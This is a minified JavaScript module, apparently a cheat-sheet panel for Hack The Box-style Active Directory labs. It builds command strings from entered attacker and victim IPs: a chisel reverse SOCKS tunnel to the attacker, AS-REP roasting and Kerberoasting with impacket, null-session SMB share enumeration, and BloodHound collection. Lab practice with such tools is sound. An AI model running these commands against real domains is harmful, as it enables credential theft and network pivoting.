var e={callbacks:{},init(e){this.callbacks=e},renderSidebar(e){e.innerHTML=`
    ...
    `;let t=()=>{let e=document.getElementById(`ad-attacker-ip`).value||`10.10.14.X`,t=document.getElementById(`ad-victim-ip`).value||`10.10.10.X`,n=document.getElementById(`ad-domain`).value||`HTB.LOCAL`;document.getElementById(`ad-chisel-client`).innerText=`./chisel client ${e}:8000 R:socks`,document.getElementById(`ad-asrep`).innerText=`impacket-GetNPUsers ${n}/ -dc-ip ${t} -request`,document.getElementById(`ad-kerb`).innerText=`impacket-GetUserSPNs -request -dc-ip ${t} ${n}/user:pass`,document.getElementById(`ad-nxc`).innerText=`nxc smb ${t} -u '' -p '' --shares`,document.getElementById(`ad-bh`).innerText=`bloodhound-python -u user -p pass -ns ${t} -d ${n} -c all`};document.getElementById(`ad-attacker-ip`).addEventListener(`input`,t),document.getElementById(`ad-victim-ip`).addEventListener(`input`,t),document.getElementById(`ad-domain`).addEventListener(`input`,t)}};export{e as ADPivotPanel};